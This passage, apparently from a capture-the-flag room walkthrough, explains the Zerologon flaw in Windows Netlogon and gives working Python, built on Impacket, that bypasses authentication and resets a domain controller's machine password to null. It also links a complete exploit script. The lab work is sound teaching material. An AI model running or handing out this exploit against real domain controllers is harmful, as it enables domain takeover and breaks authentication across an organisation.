248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token plain"> BaseException </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> ex</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fail</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f&#x27;Unexpected error: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">ex</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">.&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Line 1 is retrieving the Error Code from the Server_auth variable, or the variable assigned to establish an Authentication Session with the target device. If successful, we&#x27;re going to return the rpc_con variable which will inform us that we have successfully bypassed Authentication with Zero Logon. Lines 3-12 are simply Error handling lines so the program doesn&#x27;t break and exit after receiving an error back.</p><p><strong>End of Transmission, What&#x27;s Next? -</strong></p><p>And that&#x27;s all there is to the Proof of Concept. It&#x27;s not some giant, scary monster. It even successfully exploit the Zero Logon vulnerability for us -- but it stops and doesn&#x27;t do anything further, so how do we proceed?</p><p>Good question, next we need to take a look at the Microsoft Documentation itself and see what we can do to interact with NRPC Itself. If you&#x27;re not familiar with NRPC, and you&#x27;re not that technical of an individual, look back at the last step in Task 2, Figure 3 (hint: It tells us what we need to do).</p><p>What&#x27;s It All Mean, Doc? -
After going back and peaking at Figure 3 on Task 2, or researching how to reset a password over RDP, you should have came across the following document:
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81</a></p><p>The document outlines what information is required to change a password over NRPC. The following information is required to do so:</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">NTSTATUS NetrServerPasswordSet2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> unique</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> LOGONSRV_HANDLE PrimaryName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> wchar_t</span><span class="token operator">*</span><span class="token plain"> AccountName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> wchar_t</span><span class="token operator">*</span><span class="token plain"> ComputerName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> PNETLOGON_AUTHENTICATOR Authenticator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> PNL_TRUST_PASSWORD ClearNewPassword</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Going back and looking at <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9" target="_blank" rel="noopener noreferrer">NetrServerAuthenticate3</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81" target="_blank" rel="noopener noreferrer">NetrServerPasswordSet2</a>, we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name. So we simply need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft, so lets take a look at the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab" target="_blank" rel="noopener noreferrer">Authenticator</a> first:</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">typedef struct _NETLOGON_AUTHENTICATOR </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    NETLOGON_CREDENTIAL Credential</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    DWORD Timestamp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And suddenly we&#x27;ve hit another unknown, NETLOGON_CREDENTIAL. Fortunately, Microsoft does have documentation for NETLOGON_CREDENTIAL as well:</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">typedef struct _NETLOGON_CREDENTIAL </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    CHAR data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"> NETLOGON_CREDENTIAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token operator">*</span><span class="token plain">PNETLOGON_CREDENTIAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Per the documentation, NETLOGON_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that &quot;the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation&quot;, fortunately we know this value, thanks to Zero Logon, it&#x27;s 8 bytes of Zero. In terms of the Timestamp, it&#x27;s a DWORD value, so it can either be a one or a zero. Zero sounds perfectly find to me.</p><p>In order to change the password the Microsoft Documentation states that:
The Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes indicting the length of the password, totaling 516 bytes.
For the simplicity of this room, we can simply supply 516 bytes of all 00 to make a null password. Eventually, we can work towards creating our own custom password, but once again, for simplicity, we&#x27;re setting it to a null value now.</p><p><strong>Level Up -</strong></p><p>Now that we know the required arguments to change the password via NRPC, we actually have to implement it in Python. We need to take a look at the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py" target="_blank" rel="noopener noreferrer">nrpc.py</a> module within Impacket to see the required structure for how we can craft a netrServerPasswordSet2 Request:</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">hNetrServerPasswordSet2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dce</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> primaryName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> accountName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> secureChannelType</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> computerName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> authenticator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> clearNewPasswordBlob</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    request </span><span class="token operator">=</span><span class="token plain"> NetrServerPasswordSet2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;PrimaryName&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> checkNullString</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">primaryName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;AccountName&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> checkNullString</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">accountName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;SecureChannelType&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> secureChannelType</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;ComputerName&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> checkNullString</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">computerName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Authenticator&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> authenticator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;ClearNewPassword&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> clearNewPasswordBlob</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> dce</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As expected, most of the field nmes are the same as what Microsoft provided, except with some differences. Next, we need to know how to structure the Authenticator portion as well:</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">NETLOGON_AUTHENTICATOR</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">NDRSTRUCT</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">structure </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Credential&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> NETLOGON_CREDENTIAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Timestamp&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> DWORD</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The format here is a little bit different compared to the prior, but we&#x27;ll adjust accordingly when we go to slot it into the PoC, but while we&#x27;re talking about sloting it into the PoC, where will our added code go?</p><p>Our added code will go immediately before &quot;return rpc_con&quot; on line 45. This is where we know we have successful authentication, we want to grab that before we return to the previous function and terminate the RPC connection. Now that we know all the required information that we&#x27;ll need to add to the PoC, we&#x27;ll save you the painsteaking effort of writing your own code, and you can use the pre-written code below. The above explanations should help aid in understanding it.</p><p><strong>The Additional Code we&#x27;re slotting in:</strong></p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">    newPassRequest </span><span class="token operator">=</span><span class="token plain"> nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">NetrServerPasswordSet2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    newPassRequest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;PrimaryName&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> dc_handle </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;\x00&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    newPassRequest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;AccountName&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> target_computer </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;$\x00&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    newPassRequest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;SecureChannelType&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">NETLOGON_SECURE_CHANNEL_TYPE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ServerSecureChannel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    auth </span><span class="token operator">=</span><span class="token plain"> nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">NETLOGON_AUTHENTICATOR</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    auth</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Credential&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&#x27;\x00&#x27;</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token number">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    auth</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Timestamp&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    newPassRequest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Authenticator&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> auth</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    newPassRequest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;ComputerName&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> target_computer </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;\x00&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    newPassRequest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;ClearNewPassword&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain">  </span><span class="token string" style="color:rgb(255, 121, 198)">b&#x27;\x00&#x27;</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token number">516</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    rpc_con</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">request</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">newPassRequest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>At this point, your code should be good to go, and you should be able to successfully exploit Zero Logon. If you are still having issues, you can use the following code found here:</p><p><a href="https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py</a></p><ol><li>What method will allow us to change Passwords over NRPC?</li></ol><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81" target="_blank" rel="noopener noreferrer">3.5.4.4.5 NetrServerPasswordSet2 (Opnum 30)</a></p><p><code>NetrServerPasswordSet2</code></p><ol start="2"><li>What are the required fields for the method per the Microsoft Documentation?</li></ol><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">NTSTATUS NetrServerPasswordSet2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> unique</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> LOGONSRV_HANDLE PrimaryName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> wchar_t</span><span class="token operator">*</span><span class="token plain"> AccountName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token 